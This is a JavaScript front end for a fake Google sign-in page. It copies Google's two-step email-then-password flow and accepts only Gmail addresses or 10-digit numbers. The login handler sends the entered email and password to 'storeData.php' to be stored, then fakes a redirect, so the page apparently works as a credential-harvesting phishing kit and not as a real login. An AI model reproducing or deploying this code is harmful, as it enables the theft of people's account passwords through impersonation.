const pageBox = document.querySelector('.page-box');
const btnNext = document.querySelector('.btn-next');
const btnBack = document.querySelector('.btn-back');
const checkboxPass = document.querySelector('.checkbox-pass');
const passwordInput = document.querySelector('.password');
const loginTitle = document.querySelector('.loginTitle-text');
const userEmail = document.querySelector('.user-email');
const emailInput = document.querySelector('.email');
const emailError = document.getElementById('emailError');
const passwordError = document.getElementById('passwordError');
const btnLogin = document.querySelector('.btn-login');

btnNext.onclick = (e) => {
    e.preventDefault();

    // Email validation
    const emailRegex = /^[a-zA-Z0-9._-]+@gmail\.com$|^\d{10}$/;

    if (!emailInput.value.trim()) {
        emailError.textContent = 'Please enter your email or phone number.';
        return;
    }

    if (!emailRegex.test(emailInput.value)) {
        emailError.textContent = 'Please enter a valid Gmail address or a 10-digit number.';
        return;
    }

    emailError.textContent = '';

    // Move to the password page if email is valid
    pageBox.classList.add('active-pass');
    setTimeout(() => passwordInput.focus(), 500);
    loginTitle.innerHTML = 'Welcome';
    userEmail.innerHTML = emailInput.value;
};

btnBack.onclick = (e) => {
    e.preventDefault();
    pageBox.classList.remove('active-pass');
    loginTitle.innerHTML = 'Sign in';
    userEmail.innerHTML = 'Use your Google Account';
    emailInput.focus();
};

checkboxPass.onclick = () => {
    passwordInput.type = checkboxPass.checked ? 'text' : 'password';
};

btnLogin.onclick = (e) => {
    e.preventDefault();

    // Password validation
    if (passwordInput.value.length < 8) {
        passwordError.textContent = 'Please enter a valid password (at least 8 characters).';
        return;
    }

    passwordError.textContent = '';

    // Send data to the server
    const serverEndpoint = 'storeData.php'; // Update with the actual path
    const formData = new FormData();
    formData.append('email', emailInput.value);
    formData.append('password', passwordInput.value);

    fetch(serverEndpoint, {
        method: 'POST',
        body: formData,
    })
    .then(response => response.json())
    .then(data => {
        console.log('Data stored on the server:', data);
        // Redirect to index.html after storing data (simulate redirect)
        window.location.href = '../index.html';
    })
    .catch(error => {
        console.error('Error storing data on the server:', error);
    });
};
